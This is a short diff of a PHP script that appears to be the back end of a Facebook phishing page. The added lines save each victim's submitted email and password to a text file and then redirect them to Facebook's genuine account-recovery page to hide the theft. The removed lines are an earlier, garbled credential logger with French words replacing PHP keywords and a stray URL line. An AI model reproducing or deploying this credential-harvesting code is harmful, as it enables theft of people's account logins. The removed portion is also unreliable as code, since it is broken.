@@ -1,14 +1,5 @@
 <?php 
-http://facebook.com/login.php);
-$handle = fopen("log.txt", "a");
-foreach($_POST comme $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($poignée);
-sortie;
+file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
+header('Location: https://facebook.com/recover/initiate/');
+exit();
 ?>
-	
